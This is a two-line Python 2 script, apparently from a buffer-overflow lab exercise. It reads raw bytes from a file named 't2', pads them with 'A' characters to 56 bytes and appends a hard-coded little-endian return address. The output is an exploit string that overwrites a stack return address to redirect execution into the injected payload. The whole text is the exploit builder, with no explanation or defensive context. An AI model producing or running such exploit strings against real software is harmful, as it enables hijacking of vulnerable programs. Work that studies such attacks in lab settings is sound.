exp = open('t2','rb').read()
print exp+"A"*(56-len(exp))+"\x68\x9d\x61\x55"
